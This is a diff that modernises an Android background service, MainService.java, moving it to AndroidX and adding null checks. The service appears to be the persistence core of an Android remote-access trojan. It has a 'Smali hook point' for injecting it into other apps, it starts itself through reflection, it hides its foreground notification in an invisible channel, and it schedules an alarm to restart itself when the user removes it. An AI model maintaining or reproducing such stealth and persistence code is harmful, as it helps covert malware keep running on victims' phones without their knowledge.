@@ -13,74 +13,68 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.support.annotation.RequiresApi;
-import android.support.v4.app.NotificationCompat;
+
+// ✅ IMPORTANTES ACTUALIZADAS A ANDROIDX
+import androidx.annotation.RequiresApi;
+import androidx.core.app.NotificationCompat;
 
 import java.lang.reflect.Method;
 
 public class MainService extends Service {
     private static Context contextOfApplication;
 
-        private static void findContext() throws Exception {
-            Class<?> activityThreadClass;
-            try {
-                activityThreadClass = Class.forName("android.app.ActivityThread");
-            } catch (ClassNotFoundException e) {
-                // No context
-                return;
-            }
+    private static void findContext() throws Exception {
+        Class<?> activityThreadClass;
+        try {
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+        } catch (ClassNotFoundException e) {
+            // No context
+            return;
+        }
 
-            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-            if (context == null) {
-                // Post to the UI/Main thread and try and retrieve the Context
-                final Handler handler = new Handler(Looper.getMainLooper());
-                handler.post(new Runnable() {
-                    public void run() {
-                        try {
-                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-                            if (context != null) {
-                                startService(context);
-                            }
-                        } catch (Exception ignored) {
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+        if (context == null) {
+            // Post to the UI/Main thread and try and retrieve the Context
+            final Handler handler = new Handler(Looper.getMainLooper());
+            handler.post(new Runnable() {
+                public void run() {
+                    try {
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+                        if (context != null) {
+                            startService(context);
                         }
+                    } catch (Exception ignored) {
                     }
-                });
-            } else {
-                startService(context);
-            }
+                }
+            });
+        } else {
+            startService(context);
         }
+    }
 
-        // Smali hook point
-        public static void start() {
-            try {
-                findContext();
-            } catch (Exception ignored) {
-            }
+    // Smali hook point
+    public static void start() {
+        try {
+            findContext();
+        } catch (Exception ignored) {
         }
+    }
 
-        public static void startService(Context context) {
-            context.startService(new Intent(context, MainService.class));
-        }
-
-
+    public static void startService(Context context) {
+        context.startService(new Intent(context, MainService.class));
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
-        // TODO: Return the communication channel to the service.
-        //throw new UnsupportedOperationException("Not yet implemented");
         return null;
     }
 
-
     @Override
-    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
-    {
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
+    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startMyOwnForeground();
-        }
-        else {
+        } else {
             startForeground(1, new Notification());
         }
 
@@ -94,9 +88,7 @@ public class MainService extends Service {
         super.onDestroy();
     }
 
-
-    public static Context getContextOfApplication()
-    {
+    public static Context getContextOfApplication() {
         return contextOfApplication;
     }
 
@@ -104,32 +96,32 @@ public class MainService extends Service {
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
 
-//        Log.d(TAG, "TASK REMOVED");
-
         PendingIntent service = PendingIntent.getService(
                 getApplicationContext(),
                 1001,
                 new Intent(getApplicationContext(), MainService.class),
-                PendingIntent.FLAG_ONE_SHOT);
+                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
 
         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);
-
+        if (alarmManager != null) {
+            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);
+        }
     }
 
-
-    //    --------------------------------------My Own Foreground----------------------------------------------- //
-
+    // ✅ MÉTODO ACTUALIZADO CON ANDROIDX
     @RequiresApi(api = Build.VERSION_CODES.O)
-    private void startMyOwnForeground(){
+    private void startMyOwnForeground() {
         String NOTIFICATION_CHANNEL_ID = "com.play.service.techno";
         String channelName = "My Background Service";
-        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
+        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, 
+                NotificationManager.IMPORTANCE_NONE);
         chan.setLightColor(Color.BLUE);
         chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
+        
         NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-        assert manager != null;
-        manager.createNotificationChannel(chan);
+        if (manager != null) {
+            manager.createNotificationChannel(chan);
+        }
 
         NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
         Notification notification = notificationBuilder.setOngoing(true)
@@ -137,9 +129,7 @@ public class MainService extends Service {
                 .setPriority(NotificationManager.IMPORTANCE_MIN)
                 .setCategory(Notification.CATEGORY_SERVICE)
                 .build();
+        
         startForeground(1, notification);
     }
-
-//    --------------------------------------My Own Foreground----------------------------------------------- //
-
 }
